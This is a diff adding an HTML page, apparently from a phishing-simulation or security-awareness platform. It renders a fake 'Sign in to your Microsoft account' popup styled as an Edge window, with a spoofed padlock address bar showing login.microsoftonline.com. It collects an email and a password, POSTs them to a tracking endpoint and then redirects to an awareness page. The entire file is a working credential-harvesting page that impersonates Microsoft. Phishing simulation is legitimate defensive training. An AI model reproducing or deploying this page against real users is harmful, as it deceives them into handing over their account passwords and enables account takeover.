@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft</title>
+</head>
+<body style="margin:0;background:#f2f2f2;">
+<script>
+/* ── Tracking params from click-redirect URL ─────────────────────────── */
+const _p   = new URLSearchParams(window.location.search);
+const _cid = _p.get('cid') || '';
+const _rid = _p.get('rid') || '';
+const _sub = window.location.origin + '/phish/track/submit/' + _cid + '/' + _rid;
+
+/* ── Microsoft 4-colour logo ─────────────────────────────────────────── */
+const _msLogo = `<svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 21 21">
+  <rect x="0.5" y="0.5" width="9" height="9" fill="#F25022"/>
+  <rect x="11"  y="0.5" width="9" height="9" fill="#7FBA00"/>
+  <rect x="0.5" y="11"  width="9" height="9" fill="#00A4EF"/>
+  <rect x="11"  y="11"  width="9" height="9" fill="#FFB900"/>
+</svg>`;
+
+/* ── Microsoft wordmark ──────────────────────────────────────────────── */
+const _msTxt = `<span style="font-size:20px;font-weight:600;color:#1b1b1b;letter-spacing:-0.3px;
+  font-family:'Segoe UI',system-ui,sans-serif">Microsoft</span>`;
+
+/* ── Padlock SVG (green) ─────────────────────────────────────────────── */
+const _lock = `<svg width="11" height="13" viewBox="0 0 24 24" fill="#1e8e3e" style="flex-shrink:0">
+  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10
+    c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2
+    s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1
+    1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>`;
+
+function createMSPopup() {
+  if (document.getElementById('jsFakePopup')) return;
+
+  /* ── Overlay ─────────────────────────────────────────────────────── */
+  const overlay = document.createElement('div');
+  overlay.id = 'jsFakePopup';
+  Object.assign(overlay.style, {
+    position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
+    background: 'rgba(0,0,0,0.45)', display: 'flex', justifyContent: 'center',
+    alignItems: 'flex-start', zIndex: '9999',
+    paddingTop: '32px', boxSizing: 'border-box'
+  });
+
+  /* ── Window ──────────────────────────────────────────────────────── */
+  const win = document.createElement('div');
+  Object.assign(win.style, {
+    width: '440px', background: '#fff',
+    boxShadow: '0 8px 30px rgba(0,0,0,0.4)',
+    fontFamily: "'Segoe UI',system-ui,sans-serif",
+    overflow: 'hidden', position: 'absolute', top: '32px', left: 'calc(50% - 220px)'
+  });
+
+  /* ── Edge title bar ──────────────────────────────────────────────── */
+  const tb = document.createElement('div');
+  Object.assign(tb.style, {
+    background: '#2b2b2b', color: '#ccc', padding: '7px 10px',
+    display: 'flex', justifyContent: 'space-between', alignItems: 'center',
+    fontSize: '12px', cursor: 'move', userSelect: 'none'
+  });
+  tb.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px">
+      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 21 21">
+        <rect x="0.5" y="0.5" width="9" height="9" fill="#F25022"/>
+        <rect x="11"  y="0.5" width="9" height="9" fill="#7FBA00"/>
+        <rect x="0.5" y="11"  width="9" height="9" fill="#00A4EF"/>
+        <rect x="11"  y="11"  width="9" height="9" fill="#FFB900"/>
+      </svg>
+      <span>Sign in to your Microsoft account</span>
+    </div>
+    <div style="display:flex;gap:14px;font-size:14px">
+      <span style="cursor:pointer" title="Minimise" onclick="document.getElementById('jsFakePopup').remove()">&#8211;</span>
+      <span title="Maximise">&#9633;</span>
+      <span style="cursor:pointer" title="Close" onclick="document.getElementById('jsFakePopup').remove()">&#x2715;</span>
+    </div>`;
+
+  /* ── Edge URL bar ────────────────────────────────────────────────── */
+  const ub = document.createElement('div');
+  Object.assign(ub.style, {
+    background: '#f2f2f2', padding: '5px 12px', fontSize: '12px',
+    borderBottom: '1px solid #ddd', display: 'flex', alignItems: 'center', gap: '5px'
+  });
+  ub.innerHTML = _lock +
+    `<span style="color:#1e8e3e;font-weight:500">https://login.microsoftonline.com</span>`;
+
+  /* ── Login content ───────────────────────────────────────────────── */
+  const ct = document.createElement('div');
+  ct.style.cssText = 'padding:44px 44px 36px;';
+  ct.innerHTML = `
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:28px">
+      ${_msLogo}${_msTxt}
+    </div>
+
+    <!-- ── Step 1: email / username ── -->
+    <div id="ms1">
+      <h1 style="font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 20px">Sign in</h1>
+
+      <input id="ms-em" type="email" autocomplete="username"
+        placeholder="Email, phone, or Skype"
+        style="width:100%;padding:8px 0;border:none;border-bottom:2px solid #8a8886;
+               font-size:15px;outline:none;font-family:inherit;color:#1b1b1b;
+               box-sizing:border-box;background:transparent;transition:border-color .15s"
+        onfocus="this.style.borderBottomColor='#0078D4'"
+        onblur="this.style.borderBottomColor='#8a8886'"
+        onkeydown="if(event.key==='Enter')_msNext()">
+
+      <div style="margin:16px 0 8px">
+        <a href="#" style="color:#0078D4;font-size:13px;text-decoration:none">No account? Create one!</a>
+      </div>
+      <div style="margin-bottom:32px">
+        <a href="#" style="color:#0078D4;font-size:13px;text-decoration:none">Can't access your account?</a>
+      </div>
+
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <a href="#" style="color:#0078D4;font-size:13px;text-decoration:none">Sign-in options</a>
+        <button onclick="_msNext()"
+          style="background:#0078D4;color:#fff;border:none;padding:9px 22px;
+                 font-size:15px;cursor:pointer;font-family:inherit;min-width:108px;
+                 transition:background .15s"
+          onmouseover="this.style.background='#106EBE'"
+          onmouseout="this.style.background='#0078D4'">Next</button>
+      </div>
+    </div>
+
+    <!-- ── Step 2: password ── -->
+    <div id="ms2" style="display:none">
+      <p id="ms-em2"
+        style="font-size:14px;color:#1b1b1b;margin:0 0 4px;font-weight:600;
+               word-break:break-all"></p>
+      <h1 style="font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 20px">Enter password</h1>
+
+      <input id="ms-pw" type="password" autocomplete="current-password"
+        placeholder="Password"
+        style="width:100%;padding:8px 0;border:none;border-bottom:2px solid #8a8886;
+               font-size:15px;outline:none;font-family:inherit;color:#1b1b1b;
+               box-sizing:border-box;background:transparent;transition:border-color .15s"
+        onfocus="this.style.borderBottomColor='#0078D4'"
+        onblur="this.style.borderBottomColor='#8a8886'"
+        onkeydown="if(event.key==='Enter')_msSubmit()">
+
+      <div style="margin:14px 0 10px">
+        <a href="#" style="color:#0078D4;font-size:13px;text-decoration:none">Forgot my password</a>
+      </div>
+
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:32px">
+        <input type="checkbox" id="ms-keep" style="width:14px;height:14px;accent-color:#0078D4">
+        <label for="ms-keep" style="font-size:13px;color:#1b1b1b;cursor:pointer">Keep me signed in</label>
+      </div>
+
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <a href="#" style="color:#0078D4;font-size:13px;text-decoration:none">Sign-in options</a>
+        <button id="ms-signin-btn" onclick="_msSubmit()"
+          style="background:#0078D4;color:#fff;border:none;padding:9px 22px;
+                 font-size:15px;cursor:pointer;font-family:inherit;min-width:108px;
+                 transition:background .15s"
+          onmouseover="this.style.background='#106EBE'"
+          onmouseout="this.style.background='#0078D4'">Sign in</button>
+      </div>
+    </div>`;
+
+  win.appendChild(tb);
+  win.appendChild(ub);
+  win.appendChild(ct);
+  overlay.appendChild(win);
+  document.body.appendChild(overlay);
+
+  /* ── Drag ─────────────────────────────────────────────────────────── */
+  let _drag = false, _ox = 0, _oy = 0;
+  tb.addEventListener('mousedown', e => {
+    _drag = true;
+    const r = win.getBoundingClientRect();
+    _ox = e.clientX - r.left; _oy = e.clientY - r.top;
+    e.preventDefault();
+  });
+  document.addEventListener('mousemove', e => {
+    if (!_drag) return;
+    win.style.left = (e.clientX - _ox) + 'px';
+    win.style.top  = (e.clientY - _oy) + 'px';
+  });
+  document.addEventListener('mouseup', () => { _drag = false; });
+}
+
+/* ── Step helpers ─────────────────────────────────────────────────────── */
+function _msNext() {
+  const em = document.getElementById('ms-em').value.trim();
+  if (!em) { document.getElementById('ms-em').focus(); return; }
+  document.getElementById('ms-em2').textContent = em;
+  document.getElementById('ms1').style.display  = 'none';
+  document.getElementById('ms2').style.display  = 'block';
+  setTimeout(() => document.getElementById('ms-pw').focus(), 60);
+}
+
+function _msSubmit() {
+  const em = document.getElementById('ms-em').value.trim();
+  const pw = document.getElementById('ms-pw').value;
+  if (!pw) { document.getElementById('ms-pw').focus(); return; }
+  const btn = document.getElementById('ms-signin-btn');
+  btn.disabled = true; btn.textContent = '···';
+  if (!_cid || !_rid) {
+    setTimeout(() => document.getElementById('jsFakePopup').remove(), 400);
+    return;
+  }
+  const fd = new FormData();
+  fd.append('email', em);
+  fd.append('password', pw);
+  fetch(_sub, { method: 'POST', body: fd })
+    .finally(() => {
+      window.location.href = '/phish/awareness/' + _cid + '/' + _rid;
+    });
+}
+
+window.addEventListener('load', createMSPopup);
+</script>
+</body>
+</html>
